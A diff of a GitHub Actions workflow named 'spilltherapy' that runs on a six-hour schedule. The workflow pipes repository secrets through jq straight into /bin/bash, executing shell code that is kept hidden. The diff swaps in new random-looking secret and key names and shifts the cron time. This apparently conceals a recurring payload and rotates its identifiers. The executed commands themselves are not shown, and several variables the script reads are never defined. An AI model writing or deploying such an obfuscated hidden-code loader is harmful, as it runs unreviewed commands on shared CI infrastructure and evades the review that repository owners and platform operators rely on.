@@ -1,23 +1,22 @@
 name: spilltherapy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 2/6 * * *'
-jobs:  # 7897
+    - cron: '31 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: spilltherapy
         env:
-          gimco7: ${{ secrets.gimco7 }}
+          eoe78470: ${{ secrets.eoe78470 }}
         run: |
-          echo $gimco7 | jq -r .ba0283 | /bin/bash
-          echo $fkp80320 | jq -r .pm47634 | /bin/bash
-          echo $n670 | jq -r .bneyy42618 | /bin/bash
-          echo $aagfs9 | jq -r .way1 | /bin/bash
-          echo $jpuv6 | jq -r .djjkx5 | /bin/bash
-          echo $zgz3 | jq -r .n26283 | /bin/bash
-          echo $soymm4 | jq -r .viniz4680 | /bin/bash
+          echo $eoe78470 | jq -r .jqv3 | /bin/bash
+          echo $nkh03399 | jq -r .jk04772 | /bin/bash
+          echo $okzu263 | jq -r .wg2 | /bin/bash
+          echo $rtkt150 | jq -r .kea45 | /bin/bash
+          echo $gf5 | jq -r .ih19283 | /bin/bash
+          echo $pha19100 | jq -r .uhl9756 | /bin/bash
+          echo $lqamu36227 | jq -r .nyrc7 | /bin/bash
 
